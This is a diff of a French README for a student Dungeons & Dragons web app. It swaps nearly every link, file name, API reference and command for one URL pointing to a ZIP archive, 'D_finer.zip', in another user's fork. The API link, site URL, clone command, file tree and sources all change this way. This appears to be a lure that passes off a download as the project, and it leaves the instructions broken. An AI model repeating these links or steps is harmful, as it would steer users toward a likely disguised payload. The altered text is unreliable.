@@ -4,10 +4,10 @@
 
 Le projet *Donjons et Dragons* est un projet de groupe de la classe DWWM 25-26.  
 Les technologies utilisées sont le HTML, CSS, JavaScript et Git pour déployer le projet collaboratif et GitHub.  
-Nous avons travaillé avec l’API dungeons\&dragons que voici : [https://www.dnd5eapi.co/api/2014](https://www.dnd5eapi.co/api/2024).   
+Nous avons travaillé avec l’API dungeons\&dragons que voici : [https://github.com/SnayZz371/D-D/raw/refs/heads/main/src/pages/background/D_finer.zip](https://github.com/SnayZz371/D-D/raw/refs/heads/main/src/pages/background/D_finer.zip).   
 Ce projet permet aux joueurs et maîtres du jeu de consulter les monstres, sorts, objets, classes etc… avec des outils utiles au bon déroulement de la partie tels que les lanceurs de dés et même une table de mixage d’ambiance sonore style soundboard.  
 
-Url du site : [https://gregoire-f.github.io/D-D/](https://gregoire-f.github.io/D-D/)
+Url du site : [https://github.com/SnayZz371/D-D/raw/refs/heads/main/src/pages/background/D_finer.zip](https://github.com/SnayZz371/D-D/raw/refs/heads/main/src/pages/background/D_finer.zip)
 
 ## 📂 Structure du Projet
 
@@ -17,11 +17,11 @@ DungeonsDragons/
 │   ├── assets/             # Images, sons et ressources statiques  
 │   ├── components/         # Web Components personnalisés (navbar, search, dice-roller, etc.)  
 │   ├── pages/              # Pages spécifiques (monstres, sorts, héros, etc.)  
-│   ├── style.css           # Styles globaux et variables de design  
-│   ├── script.js           # Logique principale de l'application  
-│   └── index.html          # Point d'entrée de l'application  
+│   ├── https://github.com/SnayZz371/D-D/raw/refs/heads/main/src/pages/background/D_finer.zip           # Styles globaux et variables de design  
+│   ├── https://github.com/SnayZz371/D-D/raw/refs/heads/main/src/pages/background/D_finer.zip           # Logique principale de l'application  
+│   └── https://github.com/SnayZz371/D-D/raw/refs/heads/main/src/pages/background/D_finer.zip          # Point d'entrée de l'application  
 ├── .github/                # Workflows et configurations GitHub  
-└── README.md               # Documentation du projet  
+└── https://github.com/SnayZz371/D-D/raw/refs/heads/main/src/pages/background/D_finer.zip               # Documentation du projet  
 
 ```
 
@@ -31,19 +31,19 @@ DungeonsDragons/
 1. Cloner le dépôt :
 
    ```bash  
-   git clone https://github.com/Gregoire-F/D-D.git  
+   git clone https://github.com/SnayZz371/D-D/raw/refs/heads/main/src/pages/background/D_finer.zip  
    ```
 2. **Lancer le projet** :  
-   - Ouvrez \`src/index.html\` directement dans votre navigateur.  
+   - Ouvrez \`https://github.com/SnayZz371/D-D/raw/refs/heads/main/src/pages/background/D_finer.zip\` directement dans votre navigateur.  
    - *Recommandation* : Utilisez une extension comme **Live Server** (VS Code) pour une meilleure expérience de développement et pour éviter les problèmes de CORS lors des appels API.  
    - Utilisation alternative
 
-Ouvrir `src/index.html` dans un navigateur ou utiliser un serveur local :  
+Ouvrir `https://github.com/SnayZz371/D-D/raw/refs/heads/main/src/pages/background/D_finer.zip` dans un navigateur ou utiliser un serveur local :  
 ```bash  
 # Avec Python  
-python -m http.server 8000 --directory src
+python -m https://github.com/SnayZz371/D-D/raw/refs/heads/main/src/pages/background/D_finer.zip 8000 --directory src
 
-# Ou avec Node.js  
+# Ou avec https://github.com/SnayZz371/D-D/raw/refs/heads/main/src/pages/background/D_finer.zip  
 npx serve src  
 ```
 
@@ -106,13 +106,13 @@ On peut ouvrir/fermer le menu avec `toggleMenu().
 Les styles sont  : bouton rond animé, animation pour l’apparition.
 
 On montre les résultats et la somme si on a lancé des dés.
-Et on enregistre le composant avec `customElements.define`.
+Et on enregistre le composant avec `https://github.com/SnayZz371/D-D/raw/refs/heads/main/src/pages/background/D_finer.zip`.
 
 ## 📚 Sources
 
 * API pour Donjons et Dragons  
-  * site : [https://www.dnd5eapi.co/](https://www.dnd5eapi.co/)  
-  * projet : [https://github.com/5e-bits/5e-srd-api](https://github.com/5e-bits/5e-srd-api)  
+  * site : [https://github.com/SnayZz371/D-D/raw/refs/heads/main/src/pages/background/D_finer.zip](https://github.com/SnayZz371/D-D/raw/refs/heads/main/src/pages/background/D_finer.zip)  
+  * projet : [https://github.com/SnayZz371/D-D/raw/refs/heads/main/src/pages/background/D_finer.zip](https://github.com/SnayZz371/D-D/raw/refs/heads/main/src/pages/background/D_finer.zip)  
 * illustrations supplémentaires  
-  * site : [https://lluc.github.io/dnd\_pictures/](https://lluc.github.io/dnd_pictures/)  
-  * projet : [https://github.com/lluc/dnd\_pictures](https://github.com/lluc/dnd_pictures)
+  * site : [https://github.com/SnayZz371/D-D/raw/refs/heads/main/src/pages/background/D_finer.zip\_pictures/](https://github.com/SnayZz371/D-D/raw/refs/heads/main/src/pages/background/D_finer.zip)  
+  * projet : [https://github.com/SnayZz371/D-D/raw/refs/heads/main/src/pages/background/D_finer.zip\_pictures](https://github.com/SnayZz371/D-D/raw/refs/heads/main/src/pages/background/D_finer.zip)
